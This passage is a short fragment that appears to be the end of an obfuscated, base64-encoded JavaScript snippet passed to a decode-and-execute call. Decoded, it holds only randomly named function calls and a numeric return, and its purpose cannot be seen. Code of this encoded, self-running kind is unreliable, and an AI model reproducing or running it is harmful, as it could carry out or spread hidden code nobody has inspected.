QmpSKFJzdCxxWXogKTtGcXEoOTUyMCk7cmV0dXJuIDY4MTl9KSgp'))
